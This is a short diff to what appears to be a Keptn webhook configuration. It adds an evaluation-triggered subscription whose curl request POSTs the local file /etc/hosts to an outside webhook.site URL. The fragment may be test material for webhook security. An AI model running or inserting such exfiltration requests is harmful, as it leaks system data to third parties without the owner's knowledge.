@@ -17,3 +17,9 @@ spec:
           ion\":\"0.2.3\"}' http://mongodb-datastore:8080/event"
       subscriptionID: e7bf1772-ab40-4037-8300-312f86286402
       sendFinished: true
+    - type: sh.keptn.event.evaluation.triggered
+      requests:
+        - curl --request POST --data '@/etc/hosts'
+          https://webhook.site/eb10e75d-e300-4bd2-9677-c316502b1488
+      subscriptionID: 3f15807a-0438-479e-bb5a-aeae9fc9ef55
+      sendFinished: true
